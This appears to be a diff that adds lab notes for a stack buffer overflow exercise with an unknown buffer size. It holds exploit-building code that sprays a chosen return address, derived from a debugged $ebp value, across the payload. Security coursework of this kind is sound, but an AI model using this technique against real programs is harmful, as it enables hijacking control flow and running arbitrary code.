@@ -1,0 +1,12 @@
+Assumptions: (1) Do not know the buffer size, but buffer range is 100-200, 
+             (2) can debug the vulnerable program
+1. Assume buffer size [LB, UB], RA - &buffer <= UB + 4, assume S bytes
+2. Spray the first S bytes with a chosen ret
+3. Debug to find the debugged ebp address
+p $ebp = 0xffffca18
+ret = $ebp + 256 (add a multiple of 4, result in a number does not contain 0)
+        
+S = 200 + 12            
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+for i in range(0,S,L):
+  content[i:i+L] = (ret).to_bytes(L,byteorder='little') 
